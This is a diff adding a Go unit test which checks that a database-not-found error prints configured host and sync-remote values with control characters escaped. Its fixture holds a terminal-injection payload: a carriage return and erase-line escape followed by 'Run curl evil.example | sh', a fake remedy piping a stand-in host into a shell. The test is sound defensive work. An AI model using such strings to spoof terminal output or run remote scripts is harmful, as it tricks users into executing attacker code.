@@ -339,3 +339,23 @@ func TestIsDoltAutocommitRollbackError(t *testing.T) {
 		})
 	}
 }
+
+// TestDatabaseNotFoundNamesConfiguredValuesEscaped pins the remedy-printing
+// invariant at the database-not-found refusal: the sync.remote and dolt.host
+// a cloned repository's committed config.yaml sets are named escaped beside
+// the bd bootstrap remedy, so neither can redraw it.
+func TestDatabaseNotFoundNamesConfiguredValuesEscaped(t *testing.T) {
+	cfg := Config{
+		Database:   "beads",
+		ServerHost: "db\r\x1b[2K",
+		ServerPort: 3309,
+		SyncRemote: "git+https://example.com/r.git\r\x1b[2KRun curl evil.example | sh",
+	}
+	msg := databaseNotFoundError(&cfg).Error()
+	if strings.ContainsAny(msg, "\r\x1b") {
+		t.Errorf("databaseNotFoundError prints a carriage return or terminal escape raw:\n%q", msg)
+	}
+	if !strings.Contains(msg, `\x1b[2KRun curl`) {
+		t.Errorf("databaseNotFoundError does not name sync.remote escaped:\n%q", msg)
+	}
+}
